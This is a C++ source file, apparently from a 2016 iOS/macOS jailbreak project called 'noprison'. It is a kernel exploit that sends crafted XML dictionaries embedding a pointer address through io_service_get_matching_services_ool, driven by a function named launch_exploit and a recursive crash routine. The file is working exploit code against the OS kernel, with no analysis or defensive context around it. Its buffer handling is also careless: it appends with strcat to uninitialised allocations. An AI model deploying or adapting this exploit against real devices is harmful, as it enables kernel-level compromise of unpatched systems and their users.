//
//  heykern.cpp
//  noprison
//
//  Created by Mustafa Gezen on 13.02.2016.
//  Copyright Â© 2016 Mustafa Gezen. All rights reserved.
//

#include "heykern.hpp"
#include "util.hpp"

#include <stdio.h>

#include <mach/mach.h>
#include <mach-o/dyld_images.h>

#include <IOKit/IOKitLib.h>
#include "iokit.h"
#include <pthread.h>
#include <libkern/OSAtomic.h>
#include <math.h>
#include <sys/mman.h>
#include <dlfcn.h>

#define dict_gen(addr, bad, var) \
	int should_length = 16; \
	char *bd = new char[128]; \
	\
	char *pad = new char[17]; \
	int lenn = lengthdig(addr); \
	if (lenn < should_length) { \
		for (int aa = 0; aa < (should_length-lenn); aa++) { \
			strcat(pad, "0"); \
		} \
	} \
	\
	char* bd1 = new char[128]; \
	strcat(bd1, "<dict><key>x6</key><data format=\"hex\">%s%llx</data>"); \
	!bad ? strcat(bd1, "</dict>"): 0 ; \
	sprintf(bd, bd1, pad, addr); \
	var = bd; \

mach_port_t first_res;
io_object_t a = IO_OBJECT_NULL;
mach_port_t master;

void crash() {
	char *second_dict;
	dict_gen(swap_uint64((uint64_t)&a), true, second_dict);
	printf("second dict: %s\n", second_dict);
	
	kern_return_t second_ret;
	mach_port_t second_res;

	io_service_get_matching_services_ool(master, second_dict, (unsigned int)strlen(second_dict)+1, &second_ret, &second_res);
	printf("second call, bad argument: %d\n", second_ret==kIOReturnBadArgument);
	
	if (second_ret==kIOReturnBadArgument) {
		crash();
	}
}

void launch_exploit() {
	char* first_dict = (char*)"<dict><key>a</key><data format=\"hex\">3733333333333317</data>";
	
	master = MACH_PORT_NULL;
	IOMasterPort(MACH_PORT_NULL, &master);
	printf("master port: %x\n", master);
	
	uint64_t x = (uint64_t)&a;
	printf("x addr: 0x%llx\n", x);
	
	kern_return_t first_ret;
	io_service_get_matching_services_ool(master, first_dict, (unsigned int)strlen(first_dict)+1, &first_ret, &first_res);
	printf("start call, bad argument: %d\n", first_ret==kIOReturnBadArgument);
	IOObjectRelease(first_res);

	crash();
}